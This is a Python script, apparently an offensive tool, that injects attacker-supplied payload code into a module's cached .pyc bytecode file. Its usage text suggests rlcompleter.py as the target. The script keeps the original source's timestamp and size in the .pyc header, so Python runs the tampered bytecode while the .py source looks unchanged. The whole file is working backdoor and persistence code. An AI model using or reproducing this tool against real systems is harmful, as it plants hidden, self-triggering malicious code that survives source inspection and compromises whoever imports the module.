#!/usr/bin/env python3

import struct
import sys
import os
import builtins
import imp
import marshal
import py_compile

class patch_pyc():
    def __init__(self, org_file, nix_payload=None, windows_payload=None, version=35):
        self.nix_payload = nix_payload
        self.windows_payload = windows_payload
        self.org_file = org_file
        self.temp_bytecode = ''
        self.version = version
        
        self.read_payloads()
        self.get_bytecode()
        self.write_bytecode()
        self.write_file()

    def read_payloads(self):
        if self.nix_payload:
            self.nix = open(self.nix_payload, 'U').read()
        if self.windows_payload:
            self.windows = open(self.windows_payload, 'U').read()

    def get_bytecode(self):
        with open(self.org_file, 'U') as g:
            self.codestring = g.read()
        self.oldpycsize = len(self.codestring)
        
    def write_bytecode(self):

        self.codestring += "\n"
        
        if self.nix_payload:
            self.codestring += self.nix
        if self.windows_payload:
            self.codestring += self.windows

        codeobject = builtins.compile(self.codestring, self.org_file, 'exec')
        self.temp_bytecode = marshal.dumps(codeobject)
        
    def write_file(self):
        
        pyc_file = os.path.dirname(os.path.abspath(self.org_file)) + "/__pycache__/" + \
                   os.path.basename(self.org_file).split(".")[0] + ".cpython-" + self.version + ".pyc"

        print("PYC file temp location:", pyc_file)

        timestamp = int(os.stat(self.org_file).st_mtime)

        print("Timestamp of python file:", timestamp)
        
        print("Length of python file:", self.oldpycsize)
        
        if not os.path.isfile(pyc_file):
            #create it
            py_compile.compile(self.org_file)

        #with open(os.path.dirname(os.path.abspath(self.org_file)) + "/__pycache__/" + os.path.basename(self.org_file).split(".")[0] + ".cpython-" + self.version + ".pyc", "r+b") as f:
        #    f.seek(8, 0)
        #    oldpycsize = struct.unpack("<I", f.read(4))[0]

        #print("Old pyc size:", oldpycsize)

        with open(pyc_file, 'r+b') as f:
            f.write(imp.get_magic())
            f.write(struct.pack("<I", timestamp))
            f.write(struct.pack("<I", self.oldpycsize))
            f.write(self.temp_bytecode)

        
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="To replace rlcompleter.pyc with your code... for example")
    parser.add_argument("-p", "--path", help="path to rlcompleter.py")
    parser.add_argument("-l", "--nix", help="payload for nix")
    parser.add_argument("-w", "--windows", help="payload for windows")
    parser.add_argument("-v", "--version", help="python3.X version - 35 for 3.5")
    args = parser.parse_args()

    if not args.path:
        parser.print_help()
        sys.exit()
    if not args.version:
        print("Need python version: '-v 35' for example.")
        parser.print_help()
        sys.exit()
    if not args.nix and not args.windows:
        parser.print_help()
        sys.exit()
    patch_pyc(args.path, args.nix, args.windows, args.version)
    print("Done")
